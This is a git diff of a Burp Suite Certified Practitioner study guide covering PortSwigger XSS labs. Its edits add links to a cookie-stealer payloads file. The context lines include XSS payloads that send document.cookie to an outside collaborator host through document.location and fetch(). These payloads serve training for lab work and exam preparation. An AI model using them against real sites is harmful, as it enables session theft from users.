@@ -212,7 +212,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 {{$on.constructor('alert(1)')()}}
 ```  
 
->Cookie stealer payload using `on.constructor` that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.  
+>[Cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) using `on.constructor` that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.  
 >[PortSwigger cheat sheet for cross site scripting reference](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter))  
 
 ```JavaScript
@@ -241,7 +241,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![get-dom-xss.png](images/get-dom-xss.png)  
 
->DOM XSS cookie stealer payload in a `document.write` sink using source `location.search` inside a `<select>` element. This can be send to victim via exploit server in `<iframe>`. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
+>DOM XSS [cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) in a `document.write` sink using source `location.search` inside a `<select>` element. This can be send to victim via exploit server in `<iframe>`. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
 
 ```html
 "></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
@@ -365,7 +365,7 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 
 ![Reflected DOM-XSS source-code](images/reflected-dom-xss-source-code.png)  
 
->Testing `\"-alert(1)}//` payload we successfully escape the `eval()`. The attacker then craft an exploit phishing link to the victim with a cookie stealing payload hosted on exploit server.  
+>Testing `\"-alert(1)}//` payload we successfully escape the `eval()`. The attacker then craft an exploit phishing link to the victim with a [cookie stealing payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) hosted on exploit server.  
 >Above payload validate that the backslash **\\** is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.  
 
 ```JavaScript
@@ -431,7 +431,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 
 + [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)  
 
->Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS cookie stealer payloads.  
+>Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md).  
 
 ```JavaScript
 document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
@@ -747,7 +747,7 @@ ${alert(document.cookie)}
 
 ![xss template literal](images/xss-template-literal.png)  
   
->I fail to get a working cookie stealer bypassing all the filters for this lab......  
+>I failed to get a working cookie stealer bypassing all the filters for this lab......  
 
 [PortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)  
 
@@ -773,7 +773,7 @@ ${alert(document.cookie)}
 
 [secjuice: Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
 
->Below is the main cookie stealer payload before BASE 64 encoding it.  
+>Below is the main [cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) before BASE 64 encoding it.  
 
 ```JavaScript
 fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])
@@ -3870,6 +3870,6 @@ Youtube Information Security content creators channels (***in no particular orde
 
 >The Burp Suite Certified Practitioner exam is a challenging practical examination designed to demonstrate your web security testing knowledge and Burp Suite Professional skills.  
 >My tip when preparing, is to understand the academy labs. Extra work is required as the labs do not always provide the identification of the vulnerability step.  
->In my study notes I document the lab guides from the official PortSwigger academy to make sure I know how to identify the vulnerability, use it in different scenarios and make payloads that show the impact when exploiting the vulnerability. As example crafting a XSS cookie stealer payload instead of just calling the `print` function.  
+>In my study notes I document the lab guides from the official PortSwigger academy to make sure I know how to identify the vulnerability, use it in different scenarios and make payloads that show the impact when exploiting the vulnerability. As example crafting a XSS [cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) instead of just calling the `print` function.  
 >The BSCP qualification on my resume demonstrate a deep knowledge of the latest vulnerability classes and how to exploit Web Applications, proving my hacking ability to employers and the community.  
   
